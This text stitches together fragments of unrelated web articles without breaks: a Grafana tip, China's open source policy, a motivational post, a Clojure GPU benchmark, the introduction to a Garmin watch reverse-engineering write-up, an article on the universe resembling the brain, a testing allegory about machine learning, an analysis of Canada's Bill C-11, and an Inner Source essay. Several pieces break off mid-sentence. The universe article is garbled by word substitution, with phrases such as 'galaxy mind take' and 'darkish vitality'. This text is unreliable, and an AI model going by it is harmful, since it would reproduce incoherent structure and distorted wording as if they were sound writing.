this table). In the table's editing interface, you want the 'Overrides'
tab over on the right and then a 'fields with name matching regex'
of '<code>.*</code>' and a 'Unit' of 'String', which is found in the 'misc'
section of units.</p>

Every time you stream your favorite TV show, whether it’s on Netflix or iQiyi, chances are you are firing up some cloud servers somewhere that run on Linux, an open source operating system. If you use a smartphone made by Samsung, Huawei or Xiaomi, it’s running on Android, another open source operating system for mobile devices.&nbsp;



Open source technology already permeates our digital lives, directly or indirectly. It’s also becoming an integral part of the industrial policy of countries seeking technological independence — from India and Israel to the UK and Japan. The most determined among them is China.



China’s accelerated push to become more technologically self-sufficient is likely fueled, in part, by its trade war with the U.S., and the export sanctions the U.S. has used against Huawei, ZTE and other Chinese technology firms. A core theme coming out of China’s most recent Fifth Plenum is scientific and technological self-reliance and self-improvement, with a </p>	</div><!-- .entry-content -->

<p>You should work on the projects you’re most afraid of starting.</p>



<p>Let me explain.</p>



<p>By making us avoid potential threats, fear has allowed us to survive and evolve for millennia. But now it’s kind of outdated.</p>



<p>Our brains haven’t been able to evolve at the same pace as our environment has changed. As a result, we suck at assessing and managing risks — we’re afraid of things we have no good reason to be afraid of.</p>



<p>When we think about starting a new project, we tend to overestimate the cost of failure. For our paleolithic brains, failing is equivalent to dying. That’s why it’s so terrifying.</p>



<p>But if you start that project you’re so afraid of and fail, you’ll be able to realize that it’s not so bad — yeah, failing sucks, but it doesn’t kill you.</p>



<p>When you understand that, starting new projects stops being so scary and starts being way more exciting.</p>

A few weeks ago I've shown you how simple Clojure's
<a href="https://github.com/uncomplicate/deep-diamond">Deep Diamond</a>() is, even compared to Keras. I've also mentioned
that it's superfast. Here's how fast it is on the GPU!
</p>

<div id="outline-container-orgc0a2ae3">
<h2 id="orgc0a2ae3">TL;DR Much faster than Keras+TensorFlow on the GPU, too!</h2>
<div id="text-orgc0a2ae3">
<p>
In the <a href="https://dragan.rocks/articles/20/Going-faster-than-TensorFlow-with-Clojure">previous article</a>, we have only compared the libraries on the CPU.
Deep Diamond was considerably faster: 368 seconds vs 509 seconds. Most readers were intrigued,
but, being skeptical as they should be, they complained that CPU performance doesn't matter
anyway, since everybody uses GPU for training convolution networks;
let's do the GPU comparison then.
</p>

<p>
Both Deep Diamond, and Keras with TensorFlow, use <a href="https://developer.nvidia.com/cudnn">Nvidia's cuDNN</a> low level performance
library under the hood, and any difference is due to the higher-level implementation.
</p>

<p>
Deep Diamond completes this training in <b>21</b> seconds while Keras + TensorFlow takes <b>35</b> seconds.
The gap even increased in favor of Deep Diamond! Now the ratio is <b>1.67</b>, in place of 1.38 on the CPU.

I recently bought a watch equipped with an array of sensors (and supporting microcontrollers) to record hikes, runs, and rides. The device, a Garmin Forerunner 235, is far from the most advanced piece of technology you can buy to perform these tasks but, so far, has performed well. My partner also has a Garmin watch and rushed to show me all of the customization options available via Garmin’s ConnectIQ Store and App. That's how this all started.</p><p>Here at Atredis Partners, I spend a good chunk of time under the delusion I'm a modern Sherlock Holmes. From the outside, I'm just a middle aged person lacking sleep and, evidently, the wherewithal to shave regularly. But, in my head, I'm hot on the trail of some computational mystery. Each engagement is a frantic sprint from layman to myopic expert. To give our customers the best assessment of their technology, we have to optimize where our time is spent. We need to understand the <em>system design </em>in order to evaluate tradeoffs between attack surface, impact, and complexity. The sooner we understand a technology, the more hours we have to allocate and arrange, Jenga-like, into a plan of attack. The more complete our understanding, the more accurate and complete our determination of impact and severity. When you spend your life understanding the most important (for some definition) parts of hundreds of devices in three week bursts of effort, every device looks like a new mystery to be solved.</p><p>Some people would spend their time away from these mental sprints actually hiking, running, or biking with their cool new watch (and I do that, sometimes). I, instead, needed to understand how this wrist-based computational cluster worked. To be precise, this project was driven by my curiosity, not by nascent privacy concern. This project wasn't an effort to point out all the security bugs or persuade you that balaclava-clad shadows are tracking your every movement. I make no privacy judgement either way -- you'll have to judge your own risk tolerance. Finally, I've enjoyed my Garmin watch and the company was easy to work with while reporting issues. This isn't an indictment of their products.</p><p><strong>TL;DR:</strong> I'm a nerd. I bought an exercise watch and promptly stopped exercising to tear it apart.</p><h2>Information Gathering</h2><h3>ConnectIQ</h3><p>All of this started with a casual mention that Garmin provides a third party app store, ConnectIQ (abbreviated as CIQ), for Garmin devices. CIQ consists of an app store (<a href="https://apps.garmin.com/en-US/" target="_blank">https://apps.garmin.com/en-US/</a>), a smart phone app to install CIQ Apps on your Garmin device, and a free software development kit (SDK) for developing CIQ Apps (<a href="https://developer.garmin.com/connect-iq/overview/" target="_blank">https://developer.garmin.com/connect-iq/overview/</a>). With my deerstalker on and a pipe firmly between my teeth, the link to the ConnectIQ SDK was the first note I took in my gumshoe notebook. As far as attack surface goes (even in our broader lens of overall system understanding), being able to run code on the device is hard to beat when it comes to tools for understanding a system.</p><h3>Firmware</h3><p>The firmware was the next clue, and this one was a gamble. Devices often have encrypted or "encrypted" (encoded with the intent to obfuscate) firmware. In this case, a quick web search turned up a community <a href="http://gawisp.com/perry" target="_blank">repository of installable firmware updates for Garmin devices</a> (repository is currently down). I jotted down the Forerunner 235 firmware in my  metaphorical steno pad.</p><h3>Hardware</h3><p>The firmware runs on some set of programmable devices within the watch. Without knowing which microcontrollers are included in the watch design, reversing is more difficult. Knowing the architecture and memory map of the system-on-chips (SoCs) used will provide more clues towards understanding how the firmware is loaded and executed. Having a bill-of-materials or some approximation of such is not a strict necessity, but provides a good reference going forward while taking apart the firmware. Another web search turned up a teardown for a similar device and the FCC images provided additional clues. These were also recorded in the notepad, providing another category of data to draw from.</p><h3>The Screaming Hoards</h3><p>Lastly and reluctantly, it’s time to check if anyone has stolen our fun. Has someone already written up their efforts at understanding a Garmin device? Some searching produced a very nice write up of a TomTom watch and a handful of file format reverse engineering. This is a considerably good outcome -- our fun hadn’t been cut off but we do have a head start on some of the artifacts we'll need to analyze. I took note of links to the firmware update format (<code>RGN</code>) and a GitHub repository related to the CIQ application format (<code>PRG</code>).</p><h2>Our Investigative Notes So Far</h2><h3>Device Hardware</h3><ul data-rte-list="default"><li><p>Teardown of 735XT: <a href="https://zh.ifixit.com/Teardown/Garmin+Forerunner+735XT+Teardown/117852" target="_blank">https://zh.ifixit.com/Teardown/Garmin+Forerunner+735XT+Teardown/117852</a></p></li></ul><h3>Datasheets (based on the 735XT teardown -- not sure about 235)</h3><ul data-rte-list="default"><li><p>Maxim MAX32630: <a href="https://pdfserv.maximintegrated.com/en/an/AN6349.pdf" target="_blank">https://pdfserv.maximintegrated.com/en/an/AN6349.pdf</a></p></li><li><p>ARM Cortex-M4: <a href="https://infocenter.arm.com/help/topic/com.arm.doc.ddi0439b/DDI0439B_cortex_m4_r0p0_trm.pdf" target="_blank">https://infocenter.arm.com/help/topic/com.arm.doc.ddi0439b/DDI0439B_cortex_m4_r0p0_trm.pdf</a></p></li><li><p>Atmel SAMG53G: <a href="https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11240-32-bit-Cortex-M4-Microcontroller-SAM-G53_Datasheet.pdf" target="_blank">https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11240-32-bit-Cortex-M4-Microcontroller-SAM-G53_Datasheet.pdf</a></p></li><li><p>Atmel SAMG51G: <a href="https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11209-32-bit-Cortex-M4-Microcontroller-SAM-G51_Datasheet.pdf" target="_blank">https://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11209-32-bit-Cortex-M4-Microcontroller-SAM-G51_Datasheet.pdf</a></p></li><li><p>Maxim MAX14676: <a href="https://datasheets.maximintegrated.com/en/ds/MAX14676-MAX14676A.pdf" target="_blank">https://datasheets.maximintegrated.com/en/ds/MAX14676-MAX14676A.pdf</a></p></li><li><p>Nordic N51422: <a href="https://infocenter.nordicsemi.com/pdf/nRF51422_PS_v3.1.pdf" target="_blank">https://infocenter.nordicsemi.com/pdf/nRF51422_PS_v3.1.pdf</a></p></li><li><p>MTK MT3333: <a href="https://s3-ap-southeast-1.amazonaws.com/mediatek-labs-imgs/downloads/d54c0d5ffdffbc55f6c592c6a804d4f2.pdf" target="_blank">https://s3-ap-southeast-1.amazonaws.com/mediatek-labs-imgs/downloads/d54c0d5ffdffbc55f6c592c6a804d4f2.pdf</a></p></li><li><p>Macronix MX25U12835F: <a href="https://media.digikey.com/pdf/Data%20Sheets/Macronix/MX25U12835F.pdf" target="_blank">https://media.digikey.com/pdf/Data%20Sheets/Macronix/MX25U12835F.pdf</a></p></li></ul><h3>Development Kits</h3><ul data-rte-list="default"><li><p><a href="https://datasheets.maximintegrated.com/en/ds/MAX32630-EVKIT-MAX32631-EVKIT.pdf" target="_blank">https://datasheets.maximintegrated.com/en/ds/MAX32630-EVKIT-MAX32631-EVKIT.pdf</a></p></li></ul><h3>Device Firmware</h3><ul data-rte-list="default"><li><p>Firmware (at time of analysis): <a href="https://download.garmin.com/software/Forerunner235_790.gcd" target="_blank">https://download.garmin.com/software/Forerunner235_790.gcd</a></p></li><li><p>Firmware (patched per disclosure): <a href="https://www8.garmin.com/support/download_details.jsp?id=9575">https://www8.garmin.com/support/download_details.jsp?id=9575</a></p></li><li><p>Large archive: <a href="https://gawisp.com/perry/forerunner/" target="_blank">https://gawisp.com/perry/forerunner/</a></p></li><li><p>GCD firmware update format: <a href="https://www.memotech.franken.de/FileFormats/Garmin_GCD_Format.pdf" target="_blank">https://www.memotech.franken.de/FileFormats/Garmin_GCD_Format.pdf</a></p></li><li><p>Old IDA loader for Garmin: <a href="https://sourceforge.net/projects/garminidaloader/" target="_blank">https://sourceforge.net/projects/garminidaloader/</a></p></li></ul><h3>Host Tools</h3><ul data-rte-list="default"><li><p>Official Devkit: <a href="https://developer.garmin.com/connect-iq/" target="_blank">https://developer.garmin.com/connect-iq/</a></p></li><li><p>Monkey C Language: <a href="https://developer.garmin.com/connect-iq/monkey-c/" target="_blank">https://developer.garmin.com/connect-iq/monkey-c/</a></p></li><li><p>Presentation explaining why Monkey C: <a href="https://web.archive.org/web/20160823173012/https://developer.garmin.com/downloads/connect-iq/Wear%20Where%20Ware%20-%20Connect%20IQ%20and%20the%20wearable%20world.pdf" target="_blank">https://web.archive.org/web/20160823173012/https://developer.garmin.com/downloads/connect-iq/Wear%20Where%20Ware%20-%20Connect%20IQ%20and%20the%20wearable%20world.pdf</a></p></li><li><p>prg parser in Go: <a href="https://github.com/pzl/ciqdb" target="_blank">https://github.com/pzl/ciqdb</a></p></li></ul><h3>Similar Stuff</h3><ul data-rte-list="default"><li><p><a href="https://grangeia.io/2015/11/09/hacking-tomtom-runner-pt1/" target="_blank">https://grangeia.io/2015/11/09/hacking-tomtom-runner-pt1/</a></p></li></ul><h2>Moving on to Monkey C</h2><h3>The Game is Afoot</h3><p>With our initial flurry of web searches done, it was time to start somewhere. As I mentioned above, the ability to run your own code on the watch seems like a great place to start. Heading to the Garmin ConnectIQ site and reading more about the developer tools revealed that CIQ Apps are developed in a custom language called Monkey C. A custom language is surprising enough to require some follow-up research before diving into the actual SDK provided. The question at hand was: why did Garmin decide on a custom language?</p><p>Before unraveling that question, it’s important to take a glance at the language. As you can see below, the language appears to be made of JavaScript and Java.</p></div></div><div data-block-type="23" id="block-yui_3_17_2_1_1605286709923_36192"><div>

<p>An astrophysicist and a neurosurgeon walked right into a room.</p>
<p>It might sound like the start of a nasty joke, however what a pair of Italian researchers got here up with is a very galaxy mind take: The buildings of the observable universe, they are saying, is astonishingly much like the neuronal networks of the human mind.</p>
<p>College of Bologna astrophysicist Franco Vazza and College of Verona neurosurgeon Alberto Feletti element the stunning similarities between the cosmic community of galaxies and the advanced net of neurons within the human mind exhibit in a <a href="https://www.frontiersin.org/articles/10.3389/fphy.2020.525731/full">new paper</a> printed within the journal <em>Frontiers in Physics</em>. Regardless of being roughly 27 orders of magnitude aside in scale, the human mind and the composition of the cosmic net present related ranges of complexity and self-organization, in response to the researchers.</p>
<p>The mind accommodates an estimated 69 billion neurons, whereas the observable universe consists of at the least 100 billion galaxies, strung collectively loosely like an online. Each precise galaxies and neurons solely account for&nbsp;about 30 % of the whole plenty of the universe and mind, respectively. And each galaxies and neurons prepare themselves like beads on lengthy strings or filaments.</p>
<p>Within the case of galaxies, the remaining 70 % of mass is darkish vitality. The equal within the human mind, the duo mentioned: water.</p>
<p>“We calculated the spectral density of each techniques,” Vazza mentioned in <a href="https://phys.org/news/2020-11-human-brain-resemble-universe.html">a statement</a> concerning the work. “This can be a method usually employed in cosmology for finding out the spatial distribution of galaxies.”</p>
<p>“Our evaluation confirmed that the distribution of the fluctuation throughout the cerebellum neuronal community on a scale from 1 micrometer to 0.1 millimeters follows the identical development of the distribution of matter within the cosmic net,” he added, “however, in fact, on a bigger scale that goes from 5 million to 500 million light-years.”</p>
<p>The clustering and variety of connections emanating from every node additionally had been oddly related.</p>
<p>“As soon as once more, structural parameters have recognized sudden settlement ranges,” Feletti mentioned within the assertion. “In all probability, the connectivity throughout the two networks evolves following related bodily ideas, regardless of the putting and apparent distinction between the bodily powers regulating galaxies and neurons.”</p>
<p>The crew is hoping that their preliminary examine may result in new evaluation strategies in each cosmology and neurosurgery, permitting scientists to higher perceive how these buildings have advanced over time.</p>

  <div itemprop="articleBody">
    <p>You’re a software testing engineer, working at a big tech company. While other
engineers on your team write code, your job is to make sure the code is safe
before you push it to production. Your goal isn’t to prove the code is
“correct,” but rather to assess the risk of potential failures to the company
and <a href="http://assets.cambridge.org/97811071/72012/excerpt/9781107172012_excerpt.pdf#page=8">test
accordingly</a>.
You mainly write tests that try to rule out known or suspected failure modes,
and you spend a lot of time thinking about edge cases.</p>

<p>One day, over your morning cup of coffee, you get an email from the other
engineers on your team. They’ve decided that writing source code is too hard, so
they’ve started <strong>randomly guessing</strong> program implementations until one meets
the specification. They call this wacky approach “<a href="https://medium.com/@karpathy/software-2-0-a64152b37c35">Software
2.0</a>” or something.</p>

<p>“Not to worry,” they tell you, “we can prove it works. You don’t even have to
write tests any more!” They go on to explain that there’s this book called
“<a href="https://en.wikipedia.org/wiki/Statistical_learning_theory#:~:text=Statistical%20learning%20theory%20is%20a,predictive%20function%20based%20on%20data.">Statistical Learning
Theory</a>,”
which describes a mathematical framework that <em>proves</em> Software 2.0 can give you
a correct implementation.</p>

<p>Intrigued, you ask them for more details.</p>



<p>First, they have to assume that any future user input will be similar to what
you’ve seen previously in production. They call this the
<a href="https://en.wikipedia.org/wiki/Independent_and_identically_distributed_random_variables">IID</a>
assumption.</p>

<p>“But what about hackers?” you ask. “and what happens when we change the UI?
People change their behaviour all the time! This week they’re Googling for
election results, but next week they’ll go back to Googling Kanye West…”</p>

<p>They concede that maybe you have a point, but they definitely
need this assumption to make it work. You begrudgingly let them continue.</p>



<p>Then they tell you there’s no specification. You ask them what the hell that means.</p>

<p>“Ok, hear us out,” they say. “The old spec was basically impossible to write.
There were too many edge cases! Our poor product manager didn’t even know where
to start, honestly.”</p>

<p>Instead, they decided to ask the product manager to write down a bunch of
example user inputs along with the correct output for each example. That would
serve as the defacto specification. They call this “training data.” Then they
guess a program that meets those requirements, using this thing called gradient
descent.</p>

<p>You mention that this reminds you of <a href="https://medium.com/dev-genius/dont-just-test-the-happy-path-e3fd565bad53">happy-path
testing</a>,
where you only write tests for things you expect without thinking about possible
failure modes. In this case the training examples test the happy paths. How do
you know there aren’t still edge cases and bugs lurking around?</p>

<p>That’s where the magic of STL kicks in, they say.</p>



<p>If you assume that future inputs look like past inputs, they say, then you can
also assume future performance will look like past performance! As long as you
<strong>have enough training data</strong>, there’s a low probability that you’ll encounter
edge cases. Basically, you want the happy paths to be the only paths.</p>

<p>“But how many examples do you need to make sure there aren’t any unhappy paths?”
you ask.</p>

<p>It depends on how complicated the program you’re guessing is, they say. If the
program is super complex and you don’t know anything about it, you basically
need to enumerate all the possible inputs. They’ve been calling this the “<a href="https://analyticsindiamag.com/what-are-the-no-free-lunch-theorems-in-data-science/">No
Free Lunch Theorem</a>.”</p>

<p>But if it’s “simple” somehow and you can use that to narrow down the possible
candidate programs, then you need way less data. That part sounds kind of
reasonable to you. It reminds you of having <a href="https://en.wikipedia.org/wiki/Code_coverage">branch
coverage</a> when writing unit tests.
If you have more branches, then you have to write more tests. Similarly, if you
have more possible candidate programs, then you need more data to make sure you
pick the right one.</p>



<p>“But wait,” you say, “what if you’re wrong about how the program you’re guessing
is simple? Isn’t the problem that you don’t know the right program in the
first place?”</p>

<p>They tell you you’re right, of course, and that there’s a trade-off. There are
different kinds of simplicity with different levels of strictness.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> If you
suppose the wrong kind of simplicity from the start, that puts a hard cap on how
well you can learn the program. They call this the <em>bias</em> or <em>approximation
error</em>. On the other hand, if you don’t assume anything at all, then you need
way more data. If you don’t have enough, then you might encounter <em>variance</em> or
<em>estimation error</em>.</p>

<p>The best case, of course, is when you don’t have to guess and you know the
correct implementation of the program you want to write. Then you would have
maximum correct bias and no variance.</p>

<p>You muse that the second best case would be to just label every possible input
so that you don’t have to assume anything. They tell you that’s usually impractical (the
poor product manager can only work so much) but in some cases you basically have
<a href="https://arxiv.org/abs/2005.14165">infinite data</a> and that’s exactly what they do.</p>



<p>“So let me get this straight,” you say.</p>

<ul>
  <li>
    <p>First, you assume that the future will look like the past.</p>
  </li>
  <li>
    <p>Next, you get somebody to write down a bunch of example inputs and
correct outputs which you use as the spec.</p>
  </li>
  <li>
    <p>Then, you make some assumptions about the program you’re trying to guess. If
you make the wrong assumptions, then you cap your maximum performance. But if
you don’t make any, you might accidentally overload your product manager.</p>
  </li>
  <li>
    <p>Finally, you guess a random program that fits the spec. As long as
you have enough data, you can guarantee you did the best you could with your
assumptions and that you probably won’t hit any edge cases.</p>
  </li>
</ul>

<p>They nod. You shake your head. “I don’t know guys, this seems kind of fishy. The
IID assumption is one thing, but we also have no idea how much the approximation error is, right?”</p>

<p>They shrug. “Look man, we just don’t want to write any code, ok? It’s too hard.”
You can understand the sentiment.</p>

<p>“Besides, we don’t ever really use STL in practice.”</p>

<p>“What?”</p>

<p>“Yeah, we just set aside some of the training data as a test set. If the program
we guess does good on the training data and the test set, we just assume it’s
good to go.”</p>

<p>“But what if your test set is bad?”</p>

<p>They shrug again. “We just do our best. Sometimes we <a href="https://www.aclweb.org/anthology/2020.acl-main.442/">craft test
sets</a> that look for
<a href="https://arxiv.org/abs/1912.12598">specific properties</a>.”</p>

<p>You nod knowingly. At the end of the day, you don’t write tests to prove
correctness. You write tests to show the <a href="http://assets.cambridge.org/97811071/72012/excerpt/9781107172012_excerpt.pdf#page=8">presence or absence of
bugs</a>
in a way that appropriately manages risk. Some things never change. You take a
sip of coffee and go back to writing unit tests, suspecting your colleagues
will join you in a few years.</p>

Concept meaning Forecasting the future event by Jernej Furman (CC BY 2.0) https://flic.kr/p/2iMUpJf</p></div><div id="post-14012">

			<div>
				<p>Canada’s privacy sector privacy law was born in the late 1990s at a time when e-commerce was largely a curiosity and companies such as Facebook did not exist. For years, the privacy community has argued that Canada’s law was <a href="https://www.michaelgeist.ca/2018/03/no-longer-fit-purpose-canadian-privacy-law-needs-update/">no longer fit for purpose</a> and that a major overhaul was needed. The pace of reform has been frustrating slow, but today Innovation, Science and Industry Minister Navdeep Bains introduced the <a href="https://parl.ca/DocumentViewer/en/43-2/bill/C-11/first-reading">Consumer Privacy Protection Act</a> (technically Bill C-11, the Digital Charter Implementation Act), which represents a dramatic change in how Canada will enforce privacy law. The bill repeals the privacy provisions of the current <a href="https://laws-lois.justice.gc.ca/eng/acts/p-8.6/index.html">Personal Information Protection and Electronic Documents Act (PIPEDA)</a> and will require considerable study to fully understand the implications of the new rules.</p>
<p>This post covers six of the biggest issues in the bill: the new privacy law structure, stronger enforcement, new privacy rights on data portability, de-identification, and algorithmic transparency, standards of consent, bringing back PIPEDA privacy requirements, and codes of practice. These represent significant reforms that attempt to modernize Canadian law, though some issues addressed elsewhere such as the right to be forgotten are left for another day. Given the changes – particularly on new enforcement and rights – there will undoubtedly be considerable lobbying on the bill with efforts to water down some of the provisions. Moreover, some of the new rules require accompanying regulations, which, if the battle over anti-spam laws are a model, could take years to finalize after lengthy consultations and (more) lobbying.</p>
<p><u>1.&nbsp;&nbsp;&nbsp; New Privacy Law Structure</u></p>
<p>The CPPA dispenses with the longstanding PIPEDA model to create a fresh start for privacy law. While many of the principles are the same, the PIPEDA approach of relying on the Canadian Standards Association’s Model Code for the Protection of Personal Information as Schedule 1 to the law combined with rules for enforcement in the act itself is gone. Instead, the CPPA features the same principles – and adds several more – directly within the law itself. This will require careful comparison, but it provides the opportunity to include greater detail within the law, rather than relying on the interpretations of the Privacy Commissioner of Canada. As noted below, the new structure also includes a new privacy tribunal, the Personal Information and Data Protection Tribunal. The Tribunal will play a key enforcement role by reviewing Commissioner decisions and issuing penalties for non-compliance.</p>
<p>It is worth noting that the new law brings a new purpose that emphasizes cross-border data transfers. The new purpose references “an era in which data is constantly flowing across borders and geographical boundaries and significant economic activity relies on the analysis, circulation and exchange of personal information.” Several of the new provisions reflect this new purpose.</p>
<p><u>2. &nbsp;&nbsp;&nbsp; New Enforcement Regime</u></p>
<p>It may be odd to start with how the law is enforced, but the CPPA’s biggest changes seek to address the fundamental flaw in the current law, namely the weak enforcement model. The bill proposes several key changes to address enforcement. First, the Privacy Commissioner of Canada will have order making power that will enable the office to order compliance with the law and to recommend significant penalties for failure to do so. The lack of order making power – the commissioner has long been limited to non-binding findings – has been a critical legal shortcoming.</p>
<p>Second, the order making power comes with the ability to recommend penalties that in some cases are the highest in the G7. The potential penalties for contravening the law is “is the higher of $10,000,000 and 3% of the organization’s gross global revenue in its financial year before the one in which the penalty is imposed.” Moreover, there are even tougher penalties in cases of violations for failing to comply with some of the security breach disclosure rules, data retention requirements, identifying someone using de-identified data (except in limited circumstances), or sanctioning a whistleblower. In those circumstances, the penalties can reach $25,000,000 or 5% of the organization’s gross global revenue.</p>
<p>Third, these penalties will be levied by a new Personal Information and Data Protection Tribunal. The Tribunal, which will feature between three and six members, will hear appeals of Privacy Commissioner of Canada orders. The hearings will be public and the decisions will also be made public. The Tribunal may impose penalties, including overruling the Privacy Commissioner’s order on penalties (in other words, it can increase or decrease penalties).</p>
<p>Fourth, the law also includes whisteblower provisions that protect employees that disclose alleged privacy non-compliance to the Privacy Commissioner of Canada. The Privacy Commissioner must keep the identity of the whistleblower secret and the employer is prohibited from sanctioning or penalizing the employee for having disclosed the concern.</p>
<p>Fifth, the law features a private right of action that will allow individuals to seek damages for loss or injury suffered due to a privacy violation. The private right of action is triggered once the Privacy Commissioner has made a finding of contravention of the law (in other words, individuals must first file a complaint with the commissioner) and the finding is either not appealed to the Tribunal or the Tribunal upholds the ruling. The action must be brought within two years of the rulings.</p>
<p><u>3.&nbsp;&nbsp;&nbsp; New Privacy Rights: Data Portability, De-Identification, and Algorithmic Transparency</u></p>
<p>The bill includes a new privacy right on data portability, which involves the potential for individuals to ask organizations to transfer their personal information to another organization. This is a significant issue in several sectors, notably open banking. The rule states:</p>
<p><i>Subject to the regulations, on the request of an individual, an organization must as soon as feasible disclose the personal information that it has collected from the individual to an organization designated by the individual, if both organizations are subject to a data mobility&nbsp; framework provided under the regulations.</i></p>
<p>While the regulations will be crucial, this is a good start on an important new right.</p>
<p>The bill also includes a new access right with respect to algorithms. The algorithmic transparency provision states:</p>
<p><i>If the organization has used an automated decision system to make a prediction, recommendation or decision about the individual, the organization must, on request by the individual, provide them with an explanation of the prediction, recommendation or decision and of how the personal information that was used to make the prediction, recommendation or decision was obtained.</i></p>
<p>The bill features important rules with respect to de-identification of personal information with very strong penalties on organizations that violate the new standards. De-identification has emerged as a major issue in the world of big data, with many organizations relying on de-identified data for a wide range of purposes. As the public battle over Sidewalk Labs in Toronto demonstrated, some object to any use of their data, even if de-identified. The law seeks to strike a balance:</p>
<p><i>An organization that de-identifies personal information must ensure that any technical and administrative measures applied to the information are proportionate to&nbsp; the purpose for which the information is de-identified and the sensitivity of the personal information.</i></p>
<p>This is very vague and will require regulations to fully understand how it will apply (and even then will likely result in complaints). The government has, however, created significant penalties for those that seek to try to identify an individual using de-identified data:</p>
<p><i>An organization must not use de-identified information alone or in combination with other information to identify an individual, except in order to conduct testing of the effectiveness of security safeguards that the organization has put in place to protect the information.</i></p>
<p>Violations of this provision may trigger the maximum penalties described above.</p>
<p><u>4.&nbsp;&nbsp;&nbsp; Standards of Consent</u></p>
<p>Consent sits at the heart of modern privacy law and the consent provisions in the CPPA are amongst the most important and likely most controversial. On the one hand, the law establishes clear requirements for consent with standards on what must be included in order to valid, the need for express consent (unless the organization can demonstrate that implied consent is appropriate in the circumstances), and a prohibition on making consent a requirement for a product or service beyond what is strictly necessary. Deceptive practices to obtain consent with false or misleading information renders the consent invalid and individuals can withdraw their consent at any time.</p>
<p>On the other hand, there are many exceptions to the general consent requirement. Some that either touch on consent for collection and/or disclosure and which often replicate PIPEDA include:</p>
<ul>
<li>a range of business activities including delivery of a product or service, due diligence, or system or network security</li>
<li>transferring the information to another service provider (presumably to complete a service the individual has contracted for, but the bill is vague)</li>
<li>de-identifying the personal information</li>
<li>research and development if the data is de-identified</li>
<li>proposed or completed business transactions</li>
<li>produced in the course of the individual’s employment</li>
<li>prevent of fraud</li>
<li>witness statements</li>
<li>disclosures to the organization’s lawyers</li>
<li>journalistic, artistic or literary purposes</li>
<li>investigations</li>
<li>law enforcement</li>
</ul>
<p>There is also an exception for consent if it is in the individual’s interest. This could arise in an emergency and the individual cannot …</p></div></div></div>

<p><em>This is the first of a series of two articles describing the reasoning and the steps behind the idea of correlating software product delivery process performance metrics with community health and collaboration metrics as a way to engage execution managers so their teams participate in Open Source projects and Inner Source programs.  </em>What you will read in these articles is an extension of a talk I gave at the event InnerSource Commons Fall 2020.</p>



<p>Background</p>



<p>There is a very popular African proverb within the Free Software movement that says…</p>



<p>“<em>If you want to go fast, go alone. If you want to go far, go together.</em>“</p>



<p>Many of us used it for years to promote collaboration among commercial organizations over doing it internally in a fast way at the risk of reinventing the wheel, not following standards, reducing quality, etc.</p>

<p>The proverb describes an implicit <em>OR</em> relation between the traditional Open Source mindset, focused on longer term results obtained through extensive collaboration, and the traditional corporate mindset, where time-to-market is almost an obsession.</p>



<p>Early in my career I got exposed as manager (I do not code) to agile and a little later to Continuous Delivery. This second set of principles and practices had a big impact on me because of the tight and positive correlation that proposes between speed and quality. Until then, I had assumed that such correlation was negative, when one increases the other decreases or vice-versa.</p>



<p>During a long time, I also assumed unconsciously as truth the negative correlation between collaboration and speed. It was not until I started working in projects at scale when I became aware of such unconscious assumption and start question it first and challenging it later.</p>



<p>In my early years in Open Source I found myself many times discussing with executives and managers about the benefits of this “collaboration framework” and why they should adopt it. Like probably many of you, I found myself being more successful among executives and politicians than middle layer managers.</p>



<p>– “No wonder they are executives” I thought more than once back then.</p>



<p>But time prove me wrong once again.</p>



<p>Problem statement: can we go faster by going together?</p>



<p>It was not until later on in my career, when I could relate to good Open Source evangelists but specially good sales professionals. I learned a bit about how different groups within the same organization are incentivized differently and you need to understand those incentives to tune your message in a a way that they can relate to it.</p>



<p>Most of my arguments and those from my colleagues back then were focused on cost reductions and collaboration, on preventing silos, on shorten innovation cycles, on sustainability, prevention of vendor lock-in, etc. Those arguments resonate very well among those responsible for strategic decisions or those managers directly related with innovation. But they did not work well with execution managers, specially senior ones.</p>



<p>When I have been a manager myself in the software industry, frequently my incentives had little to do with those arguments. In some cases, either my manager’s incentives had little to do with such arguments despite being an Open Organization. Open Source was part of the company culture but management objectives had little to do with collaboration. Variables like productivity, efficiency, time-to-market, customer satisfaction, defects management, release cycles, yearly costs, etc., were the core incentives that drove my actions and those around me. </p>



<p>If that was the case for those organizations I was involved in back then, imagine traditional corporations. Later on I got engage with such companies which confirmed this intuition.</p>



<p>I found myself more than once arguing with my managers about priorities and incentives, goals and KPIs because, as Open Source guy, I was for some time unable to clearly articulate the positive correlation between collaboration and efficiency, productivity, cost reduction etc. In some cases, this inability was a factor in generating a collision that end up with my bones out of the organization.</p>



<p>That positive correlation between collaboration and productivity was counter-intuitive for many middle managers I know ten years ago. Still is for some, even in the Open Source space. Haven’t you heard from managers that if you want to meet deadlines do not work upstream because you go move slower? I’ve heard so many times that, as mentioned before, during years I believed it was true. It might at small scale, but at big scale, it is not necessarily true.</p>



<p>It was not until two or three years ago that I started paying attention to Inner Source. I realized that many have inherited this belief. And since they live in corporate environments, the challenge that represents convincing execution related managers is bigger than in Open Source. </p>



<p>Inner Source programs are usually supported by executives and R&amp;D departments but receive resistance from middle management, especially those closer to execution units. Collaborating with other departments might be good in the long term but it is perceived as less productive than developing in isolation. Somehow, in order to participate in Inner Source programs, they see themselves choosing between shorter-term and longer-term goals, between their incentives and those of the executives. It has little to do with their ability to “<em>get it</em>“.</p>



<p>So either their incentives are changed and they demonstrate that the organization can still be profitable, or you need to adapt to those incentives. What I believe is that adapting to those incentives means, in a nutshell, to provide a solid answer to the question, <em>can we go faster by going together?</em></p>



<p>The proposed solution: if you want to go far, together is faster.</p>



<p>If we could find a positive correlation between efficiency/productivity and collaboration, we could change the proverb above by something like…</p>



